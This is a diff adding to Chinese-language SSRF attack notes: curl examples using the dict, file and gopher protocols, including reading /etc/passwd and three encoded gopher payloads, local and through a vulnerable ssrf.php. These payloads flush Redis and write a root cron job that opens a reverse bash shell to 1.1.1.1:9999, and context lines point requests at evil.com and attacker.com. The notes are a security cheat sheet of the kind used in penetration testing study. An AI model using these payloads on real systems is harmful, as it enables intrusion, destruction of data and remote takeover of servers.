@@ -65,8 +65,8 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
     * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
   * `gopher://` Gopher是一种分布式文档传递服务
     * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
-    
-### 测试方法 - 以gopher为例
+
+### 测试方法及原理 - 以gopher为例
 
 前提：存在SSRF漏洞的web后端所在的服务器必须支持gopher协议，攻击者构造http请求中的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。
 
@@ -93,6 +93,41 @@ ssrf
 ```
 
 [SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`
+
+
+### 利用cURL的多种协议
+
+cURL支持的协议很多
+```
+$ curl -V
+curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  
+Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  
+Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets
+```
+
+```
+# dict protocol (操作Redis)
+# 本地测试
+curl -vvv 'dict://127.0.0.1:6379/info'
+```
+
+```
+# file protocol (任意文件读取)
+# 本地测试
+curl -vvv 'file:///etc/passwd'
+```
+
+```
+# gopher protocol (利用redis写入var/spool/cron实现反弹Bash)  注意:会清空redis的数据!
+# 本地测试 方式1
+curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
+
+# 本地测试 方式2
+curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
+
+# 远程测试 方式3
+curl -v 'http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.1.1.1%2F9999%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
+```
 
 
 ### 绕过技巧
